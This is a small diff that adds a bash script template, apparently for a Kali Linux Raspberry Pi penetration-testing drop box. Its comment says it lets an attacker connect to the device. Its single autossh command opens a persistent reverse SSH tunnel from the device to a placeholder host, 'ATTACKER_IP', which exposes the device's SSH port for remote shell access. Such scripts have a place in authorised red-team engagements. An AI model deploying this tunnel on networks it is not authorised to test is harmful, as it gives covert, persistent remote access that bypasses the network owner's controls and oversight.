@@ -1,0 +1,5 @@
+#!/bin/bash
+# Add your machine IP and rename to autossh.sh
+# This will create a tunnel so that an attacker can connect to KaliPi5
+autossh -M 12345 -N -f -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no"  -i path/to/id_rsa_key -R 2222:localhost:22 user@ATTACKER_IP
+
